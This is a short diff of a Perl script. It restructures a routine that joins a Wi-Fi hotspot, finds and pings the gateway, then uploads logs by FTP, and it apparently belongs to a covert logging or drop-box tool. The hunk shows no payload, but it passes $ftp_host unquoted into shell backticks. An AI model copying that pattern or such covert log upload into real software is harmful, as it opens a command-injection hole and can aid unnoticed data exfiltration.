@@ -216,18 +216,19 @@ sub wlan_connect_upload{
                $ftp_host = qx(netstat -r | grep ^default | awk '{print \$2}');
         } else{ $ftp_host = $ftp_host_ip;}
 
-       if ("$ftp_host" =~ /[0-9]/ ) {
-           print "[+] got gateway $ftp_host\n";
+       if ("$ftp_host" =~ /[0-9]/ ) 
+       {
+            print "[+] got gateway $ftp_host\n";
+            $ping = qx(ping -c 2 $ftp_host);
+            if ( "$ping" =~ /ttl=/ ) 
+             {
+                 print "[+] associated to hotspot\n";
+                 print "[+] gateway is alive\n";
+                 print "[*] attempting to upload logs via FTP\n";
+                 upload_logs();
+             } else { print "[!] link cannot be established!\n"; }
+             
        } else { print "[!] gateway could not be established\n"; }
-
-       $ping = qx(ping -c 2 $ftp_host);
-       if ( "$ping" =~ /ttl=/ ) {
-
-            print "[+] associated to hotspot\n";
-            print "[+] gateway is alive\n";
-            print "[*] attempting to upload logs via FTP\n";
-            upload_logs();
-        } else { print "[!] link cannot be established!\n"; }
 
    } else { print"[!] could not associate to hotspot at $time\n"; }
 
